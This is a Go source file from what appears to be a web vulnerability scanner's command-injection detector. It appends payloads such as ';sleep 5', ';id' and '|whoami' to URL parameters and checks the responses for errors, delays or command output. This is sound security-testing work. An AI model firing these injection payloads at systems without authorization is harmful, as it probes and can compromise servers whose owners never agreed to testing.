package cmdi

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/bytezora/recon-x/internal/finding"
	"github.com/bytezora/recon-x/internal/httpclient"
)

type Result struct {
	URL      string
	Param    string
	Payload  string
	Evidence string
	Method   string // "error", "time", "output"
	Detected bool
}

func (r Result) ToFinding() finding.Finding {
	sev := finding.High
	conf := finding.Likely
	if r.Method == "output" {
		sev = finding.Critical
		conf = finding.Confirmed
	}
	return finding.Finding{
		Type:               "cmdi",
		Severity:           sev,
		Confidence:         conf,
		Title:              "OS Command Injection — parameter: " + r.Param,
		AffectedURL:        r.URL,
		Evidence:           r.Evidence,
		Reason:             "Command injection via method: " + r.Method,
		Remediation:        "Never pass user input to system commands. Use safe APIs. Validate and sanitize all inputs.",
		ManualVerification: r.Method != "output",
	}
}

var errorPayloads = []string{
	";invalid_cmd_xyz_1234",
	"|invalid_cmd_xyz_1234",
	"`invalid_cmd_xyz_1234`",
}

var errorIndicators = []string{
	"command not found",
	"not recognized as",
	"/bin/sh",
	"sh: 1:",
	"invalid_cmd_xyz_1234",
}

var timePayloads = []string{
	";sleep 5",
	"|sleep 5",
	";ping -c 5 127.0.0.1",
}

var outputPayloads = []string{
	";id",
	";whoami",
	"|id",
	"|whoami",
}

var outputIndicators = []string{
	"uid=",
	"gid=",
	"root",
	"www-data",
}

func testURL(client *http.Client, rawURL string) []Result {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	params := parsed.Query()
	if len(params) == 0 {
		return nil
	}

	var results []Result
	seen := map[string]bool{}

	for param := range params {
		// Error-based
		for _, payload := range errorPayloads {
			testParams := cloneParams(params)
			testParams.Set(param, testParams.Get(param)+payload)
			testU := *parsed
			testU.RawQuery = testParams.Encode()

			key := param + "|error|" + payload
			if seen[key] {
				continue
			}

			req, err := http.NewRequest("GET", testU.String(), nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			body := strings.ToLower(string(data))

			for _, ind := range errorIndicators {
				if strings.Contains(body, strings.ToLower(ind)) {
					seen[key] = true
					results = append(results, Result{
						URL:      rawURL,
						Param:    param,
						Payload:  payload,
						Evidence: "Command error indicator: " + ind,
						Method:   "error",
						Detected: true,
					})
					break
				}
			}
		}

		// Time-based
		for _, payload := range timePayloads {
			testParams := cloneParams(params)
			testParams.Set(param, testParams.Get(param)+payload)
			testU := *parsed
			testU.RawQuery = testParams.Encode()

			key := param + "|time|" + payload
			if seen[key] {
				continue
			}

			timeClient := httpclient.New(12*time.Second, false)

			// Baseline: measure normal response time before injection
			baseReq, err := http.NewRequest("GET", rawURL, nil)
			if err != nil {
				continue
			}
			baseReq.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
			baseStart := time.Now()
			baseResp, baseErr := timeClient.Do(baseReq)
			baseline := time.Since(baseStart)
			if baseErr == nil {
				io.Copy(io.Discard, baseResp.Body)
				baseResp.Body.Close()
			}

			req, err := http.NewRequest("GET", testU.String(), nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
			start := time.Now()
			resp, err := timeClient.Do(req)
			elapsed := time.Since(start)
			if err == nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
			// Only flag if response is at least 4s longer than baseline
			if elapsed >= baseline+4*time.Second {
				seen[key] = true
				results = append(results, Result{
					URL:      rawURL,
					Param:    param,
					Payload:  payload,
					Evidence: "Response delayed by " + elapsed.Round(time.Millisecond).String() + " (baseline: " + baseline.Round(time.Millisecond).String() + ")",
					Method:   "time",
					Detected: true,
				})
			}
		}

		// Output-based
		for _, payload := range outputPayloads {
			testParams := cloneParams(params)
			testParams.Set(param, testParams.Get(param)+payload)
			testU := *parsed
			testU.RawQuery = testParams.Encode()

			key := param + "|output|" + payload
			if seen[key] {
				continue
			}

			req, err := http.NewRequest("GET", testU.String(), nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			body := strings.ToLower(string(data))

			for _, ind := range outputIndicators {
				if strings.Contains(body, ind) {
					seen[key] = true
					results = append(results, Result{
						URL:      rawURL,
						Param:    param,
						Payload:  payload,
						Evidence: "Command output indicator: " + ind,
						Method:   "output",
						Detected: true,
					})
					break
				}
			}
		}
	}
	return results
}

func Detect(urls []string, threads int, onFound func(Result)) []Result {
	if threads <= 0 {
		threads = 10
	}
	client := httpclient.New(15*time.Second, false)

	var (
		mu      sync.Mutex
		results []Result
		wg      sync.WaitGroup
		sem     = make(chan struct{}, threads)
		seen    = make(map[string]bool)
	)

	for _, rawURL := range urls {
		sem <- struct{}{}
		wg.Add(1)
		go func(u string) {
			defer func() { <-sem; wg.Done() }()
			found := testURL(client, u)
			if len(found) > 0 {
				mu.Lock()
				for _, r := range found {
					key := r.URL + "|" + r.Param + "|" + r.Method + "|" + r.Payload
					if !seen[key] {
						seen[key] = true
						results = append(results, r)
						if onFound != nil {
							onFound(r)
						}
					}
				}
				mu.Unlock()
			}
		}(rawURL)
	}
	wg.Wait()
	return results
}

func cloneParams(src url.Values) url.Values {
	dst := url.Values{}
	for k, v := range src {
		dst[k] = append([]string{}, v...)
	}
	return dst
}
